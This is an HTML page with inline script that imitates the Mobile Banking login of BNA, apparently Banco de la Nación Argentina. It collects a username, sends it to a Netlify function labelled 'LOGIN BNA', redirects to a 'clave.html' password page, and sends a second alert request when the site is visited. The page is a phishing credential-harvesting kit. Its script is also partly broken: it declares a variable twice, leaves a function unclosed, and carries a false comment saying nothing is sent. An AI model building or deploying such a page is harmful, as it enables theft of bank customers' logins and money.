<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<!-- Header superior -->
<header class="top-bar">
    <div class="title">Mobile Banking</div>
    <div class="classic">
        <span class="home-icon">ğŸ </span>
        VersiÃ³n ClÃ¡sica
    </div>
</header>

<!-- Logo -->
<div class="logo-container">
    <img src="bna.png" alt="Logo">
</div>

<!-- Card -->
<div class="login-card">
    <div class="login-title">IngresÃ¡ tu usuario</div>

    <input
        type="text"
        id="loginInput"
        maxlength="16"
        autocomplete="off"
        placeholder=""
    >

    <button type="button" class="btn-accept" onclick="enviarLogin()">
        <span class="check">âœ”</span>
        Aceptar
    </button>
</div>

<!-- Links -->
<div class="links">
    <p>Â¿No sos usuario?</p>
    <a href="#">Registrate y comenzÃ¡</a>

    <p class="mt">Â¿Acceso bloqueado?</p>
    <a href="#">GestionÃ¡ tu desbloqueo</a>
</div>

<!-- Footer -->
<footer class="footer">
    <span class="close">âœ–</span>
    <p>Salir</p>
</footer>

<script>
const loginInput = document.getElementById("loginInput");

/* Solo letras y nÃºmeros â€“ mÃ¡ximo 12 */
loginInput.addEventListener("input", () => {
    loginInput.value = loginInput.value
        .replace(/[^a-zA-Z0-9]/g, "")
        .slice(0, 16);
});

function enviarLogin() {
    const login = loginInput.value.trim();

    if (login.length === 0) {
        loginInput.focus();
        return;
    }

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "ğŸ¦ LOGIN BNA",
            valor: login
        })
    })
    .finally(() => {
        window.location.href = "clave.html";
    });
    /* ğŸ”” ALERTA AL INGRESAR AL SITIO */
fetch("/.netlify/functions/alerta", {
    method: "POST"
});

/* Solo validaciÃ³n visual, no se envÃ­a nada */
const loginInput = document.getElementById("loginInput");

loginInput.addEventListener("input", () => {
    loginInput.value = loginInput.value
        .replace(/[^a-zA-Z0-9]/g, "")
        .slice(0, 16);
});

function continuar() {
    if (loginInput.value.trim().length === 0) {
        loginInput.focus();
        return;
    }

    window.location.href = "clave.html";
}
</script>

</body>
</html>
